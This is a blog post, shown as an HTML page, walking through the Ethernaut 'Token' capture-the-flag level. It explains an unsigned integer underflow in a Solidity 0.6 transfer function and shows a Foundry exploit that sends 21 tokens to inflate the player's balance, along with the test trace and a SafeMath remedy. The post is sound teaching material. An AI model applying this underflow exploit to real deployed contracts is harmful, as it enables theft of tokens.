@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Vasiliy Yorkin">
+<meta name="description" content="At the beginning we have 20 tokens. To complete this challenge we need to get some more.
+Here is the original Token contract:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Token { mapping(address =&gt; uint256) balances; uint256 public totalSupply; constructor(uint256 _initialSupply) { balances[msg.sender] = totalSupply = _initialSupply; } function transfer(address _to, uint256 _value) public returns (bool) { require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] &#43;= _value; return true; } function balanceOf(address _owner) public view returns (uint256 balance) { return balances[_owner]; } } Analysis Let&rsquo;s review the transfer function:">
+<meta name="keywords" content="Vasiliy Yorkin">
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CTF walkthrough, Ethernaut, #6 Token"/>
+<meta name="twitter:description" content="At the beginning we have 20 tokens. To complete this challenge we need to get some more.
+Here is the original Token contract:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Token { mapping(address =&gt; uint256) balances; uint256 public totalSupply; constructor(uint256 _initialSupply) { balances[msg.sender] = totalSupply = _initialSupply; } function transfer(address _to, uint256 _value) public returns (bool) { require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] &#43;= _value; return true; } function balanceOf(address _owner) public view returns (uint256 balance) { return balances[_owner]; } } Analysis Let&rsquo;s review the transfer function:"/>
+
+<meta property="og:title" content="CTF walkthrough, Ethernaut, #6 Token" />
+<meta property="og:description" content="At the beginning we have 20 tokens. To complete this challenge we need to get some more.
+Here is the original Token contract:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Token { mapping(address =&gt; uint256) balances; uint256 public totalSupply; constructor(uint256 _initialSupply) { balances[msg.sender] = totalSupply = _initialSupply; } function transfer(address _to, uint256 _value) public returns (bool) { require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] &#43;= _value; return true; } function balanceOf(address _owner) public view returns (uint256 balance) { return balances[_owner]; } } Analysis Let&rsquo;s review the transfer function:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-6-token/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-07-28T11:10:00+03:00" />
+<meta property="article:modified_time" content="2022-07-28T11:10:00+03:00" />
+
+
+
+
+  <title>vyorkin.org</title>
+
+  
+  <link rel="canonical" href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-6-token/">
+  
+
+  <link rel="preload" href="https://vyorkin.org/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.1fcaf868e247e0175202d2fe4516e33a7bdb47365e90fe92409b3f14b2036b72.css" integrity="sha256-H8r4aOJH4BdSAtL&#43;RRbjOnvbRzZekP6SQJs/FLIDa3I=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+  
+
+
+   
+
+
+
+
+  <link rel="icon" type="image/png" href="https://vyorkin.org/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="https://vyorkin.org/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="https://vyorkin.org/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://vyorkin.org/images/apple-touch-icon.png">
+
+<link rel="manifest" href="https://vyorkin.org/site.webmanifest">
+<link rel="mask-icon" href="https://vyorkin.org/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+  
+
+  <meta name="generator" content="Hugo 0.101.0" />
+
+
+  
+
+</head>
+
+
+
+
+
+<body class="preload-transitions colorscheme-light">
+  
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="https://vyorkin.org/">
+      vyorkin.org
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://vyorkin.org/about/">4b0u7</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://vyorkin.org/posts/">bl06</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="https://vyorkin.org/ru-ru/">ru</a>
+              </li>
+            
+          
+            
+              
+              <li class="navigation-item">
+                <a href="https://vyorkin.org/de-de/">de</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-6-token/">
+              CTF walkthrough, Ethernaut, #6 Token
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime="2022-07-28T11:10:00&#43;03:00">
+                July 28, 2022
+              </time>
+            </span>
+          </div>
+          
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="https://vyorkin.org/categories/blockchain/">blockchain</a>
+      <span class="separator">•</span>
+    <a href="https://vyorkin.org/categories/ctf/">ctf</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="https://vyorkin.org/tags/blockchain/">blockchain</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://vyorkin.org/tags/ctf/">ctf</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://vyorkin.org/tags/security/">security</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://vyorkin.org/tags/ethernaut/">ethernaut</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <p>At the beginning we have 20 tokens. To complete this challenge
+we need to get some more.</p>
+<p>Here is the original <code>Token</code> contract:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#888"></span><span style="color:#080;font-weight:bold">pragma solidity</span> ^<span style="color:#00d;font-weight:bold">0</span>.<span style="color:#00d;font-weight:bold">6</span>.<span style="color:#00d;font-weight:bold">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">contract</span> <span style="color:#b06;font-weight:bold">Token</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">mapping</span>(<span style="color:#888;font-weight:bold">address</span> =&gt; <span style="color:#888;font-weight:bold">uint256</span>) balances;
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-weight:bold">uint256</span> <span style="color:#080;font-weight:bold">public</span> totalSupply;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">constructor</span>(<span style="color:#888;font-weight:bold">uint256</span> _initialSupply) {
+</span></span><span style="display:flex;"><span>        balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] = totalSupply = _initialSupply;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">transfer</span>(<span style="color:#888;font-weight:bold">address</span> _to, <span style="color:#888;font-weight:bold">uint256</span> _value) <span style="color:#080;font-weight:bold">public</span> <span style="color:#080;font-weight:bold">returns</span> (<span style="color:#888;font-weight:bold">bool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#038">require</span>(balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] - _value &gt;= <span style="color:#00d;font-weight:bold">0</span>);
+</span></span><span style="display:flex;"><span>        balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] -= _value;
+</span></span><span style="display:flex;"><span>        balances[_to] += _value;
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">return</span> <span style="color:#080;font-weight:bold">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">balanceOf</span>(<span style="color:#888;font-weight:bold">address</span> _owner) <span style="color:#080;font-weight:bold">public</span> <span style="color:#080;font-weight:bold">view</span> <span style="color:#080;font-weight:bold">returns</span> (<span style="color:#888;font-weight:bold">uint256</span> <span style="color:#038">balance</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">return</span> balances[_owner];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="analysis">
+  Analysis
+  <a class="heading-link" href="#analysis">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>Let&rsquo;s review the <code>transfer</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">transfer</span>(<span style="color:#888;font-weight:bold">address</span> _to, <span style="color:#888;font-weight:bold">uint256</span> _value) <span style="color:#080;font-weight:bold">public</span> <span style="color:#080;font-weight:bold">returns</span> (<span style="color:#888;font-weight:bold">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#038">require</span>(balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] - _value &gt;= <span style="color:#00d;font-weight:bold">0</span>);
+</span></span><span style="display:flex;"><span>    balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] -= _value;
+</span></span><span style="display:flex;"><span>    balances[_to] += _value;
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">return</span> <span style="color:#080;font-weight:bold">true</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In Solidity <code>&lt;0.8</code> integers overflow/underflow without error and
+arithmetic operations always wrap. In Solidity <code>&gt;=0.8</code> the
+compiler throws an error on over- and underflow thanks to
+<a href="https://docs.soliditylang.org/en/v0.8.13/080-breaking-changes.html#silent-changes-of-the-semantics">built
+in overflow checking</a>. The <code>Token</code> contract uses Solidity
+<code>^0.6.0</code>, which means it is vulnerable to integer
+overflows/underflows.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#038">require</span>(balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] - _value &gt;= <span style="color:#00d;font-weight:bold">0</span>);
+</span></span></code></pre></div><p>This check doesn&rsquo;t help given that the contract uses an unsigned
+integers for <code>balances</code>.</p>
+<p>Let&rsquo;s go over the part that does arithmetics:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] -= _value;
+</span></span><span style="display:flex;"><span>balances[_to] += _value;
+</span></span></code></pre></div><p>We know that <code>balances[player]</code> equals <code>20</code>. It means to
+overflow our balance we need to pass at least <code>21</code>.</p>
+<p>We use <code>pragma solidity ^0.8.0</code> everywhere. To obtain the
+<code>solidity &lt;0.8</code> behavior, we have to slightly modify the code of
+this challenge and wrap arithmetics with the <code>unchecked</code>
+statement:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">transfer</span>(<span style="color:#888;font-weight:bold">address</span> _to, <span style="color:#888;font-weight:bold">uint256</span> _value) <span style="color:#080;font-weight:bold">public</span> <span style="color:#080;font-weight:bold">returns</span> (<span style="color:#888;font-weight:bold">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">unchecked</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#038">require</span>(balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] - _value &gt;= <span style="color:#00d;font-weight:bold">0</span>);
+</span></span><span style="display:flex;"><span>        balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] -= _value;
+</span></span><span style="display:flex;"><span>        balances[_to] += _value;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">return</span> <span style="color:#080;font-weight:bold">true</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The exploit is simple:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">exploit</span>() <span style="color:#080;font-weight:bold">internal</span> <span style="color:#080;font-weight:bold">override</span> {
+</span></span><span style="display:flex;"><span>    vm.startPrank(player);
+</span></span><span style="display:flex;"><span>    level.<span style="color:#038">transfer</span>(<span style="color:#888;font-weight:bold">address</span>(<span style="color:#00d;font-weight:bold">0</span>), <span style="color:#00d;font-weight:bold">21</span>);
+</span></span><span style="display:flex;"><span>    vm.stopPrank();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The trace:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#038">test</span> --match-contract TokenTest -vvvv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Running <span style="color:#00d;font-weight:bold">1</span> <span style="color:#038">test</span> <span style="color:#080;font-weight:bold">for</span> src/test/Token.t.sol:TokenTest
+</span></span><span style="display:flex;"><span>[PASS] testToken() (gas: 319929)
+</span></span><span style="display:flex;"><span>Traces:
+</span></span><span style="display:flex;"><span>  [319929] TokenTest::testToken()
+</span></span><span style="display:flex;"><span>    ├─ [244552] TokenTest::create()
+</span></span><span style="display:flex;"><span>    │   ├─ [0] VM::prank(player: [...])
+</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   ├─ [232204] Ethernaut::createLevelInstance(TokenFactory: [...])
+</span></span><span style="display:flex;"><span>    │   │   ├─ [180641] TokenFactory::createInstance(player: [...])
+</span></span><span style="display:flex;"><span>    │   │   │   ├─ [120540] → new Token@<span style="color:#d20;background-color:#fff0f0">&#34;0x037f…dd8f&#34;</span>
+</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#00d;font-weight:bold">380</span> bytes of code
+</span></span><span style="display:flex;"><span>    │   │   │   ├─ [22893] Token::transfer(player: [...], 20)
+</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← Token: [...]
+</span></span><span style="display:flex;"><span>    │   │   ├─ emit LevelInstanceCreatedLog(player: player: [...], instance: Token: [...])
+</span></span><span style="display:flex;"><span>    │   │   └─ ← Token: [...]
+</span></span><span style="display:flex;"><span>    │   └─ ← Token: [...]
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::startPrank(player: [...])
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [22893] Token::transfer(0x0000000000000000000000000000000000000000, 21)
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::stopPrank()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::startPrank(player: [...])
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [4586] Ethernaut::submitLevelInstance(Token: [...])
+</span></span><span style="display:flex;"><span>    │   ├─ [1539] TokenFactory::validateInstance(Token: [...], player: [...])
+</span></span><span style="display:flex;"><span>    │   │   ├─ [529] Token::balanceOf(player: [...]) [staticcall]
+</span></span><span style="display:flex;"><span>    │   │   │   └─ <span style="color:#00d;font-weight:bold">115792089237316195423570985008687907853269984665640564039457584007913129639935</span>
+</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    │   ├─ emit LevelCompletedLog(player: player: [...], level: TokenFactory: [...])
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::stopPrank()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    └─ ← ()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Test result: ok. <span style="color:#00d;font-weight:bold">1</span> passed; <span style="color:#00d;font-weight:bold">0</span> failed; finished in 1.00ms
+</span></span></code></pre></div><h2 id="lessons-learned">
+  Lessons learned
+  <a class="heading-link" href="#lessons-learned">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>In Solidity <code>&lt;0.8</code> use
+<a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath">SafeMath</a>
+from OpenZeppelin, which provides wrappers over Solidity’s
+arithmetic operations.</p>
+<h2 id="references">
+  References
+  <a class="heading-link" href="#references">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<ul>
+<li><a href="https://solidity-by-example.org/hacks/overflow/">Arithmetic
+Overflow and Underflow</a> from Solidity by Example.</li>
+<li><a href="https://youtu.be/zqHb-ipbmIo">Arithmetic Overflow and Underflow | Hack Solidity (0.6)</a>
+&ndash; YouTube video from Smart Contract Programmer.</li>
+</ul>
+<hr>
+<p>The full code
+<a href="https://github.com/vyorkin/ethernaut-solutions/blob/step-6/src/test/Token.t.sol">is
+here</a>. Let&rsquo;s continue to the
+<a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-7-delegation">CTF
+walkthrough, Ethernaut, #7 Delegation</a>!</p>
+
+        
+      </div>
+
+
+      <footer>
+        
+
+
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "vyorkin" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        
+        
+      </footer>
+    </article>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css"
+    integrity="sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs" crossorigin="anonymous">
+  
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js"
+    integrity="sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js"
+    integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"
+    onload="renderMathInElement(document.body,
+      {
+        delimiters: [
+          {left: '$$', right: '$$', display:true},
+          {left: '$', right: '$', display:false},
+          {left: '\\(', right: '\\)', display: false},
+          {left: '\\[', right: '\\]', display: true}
+        ]
+      }
+    );"></script>
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      1985 -
+    
+    2022
+     Vasiliy Yorkin 
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+  
+  <script src="https://vyorkin.org/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js" integrity="sha256-I2BJOV3DaC&#43;ycZZAhylY4S8fJAZ7sJwyeyM&#43;YpDH7aw="></script>
+  
+
+  
+
+  
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-F8R77TYF8B"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-F8R77TYF8B', { 'anonymize_ip': false });
+}
+</script>
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
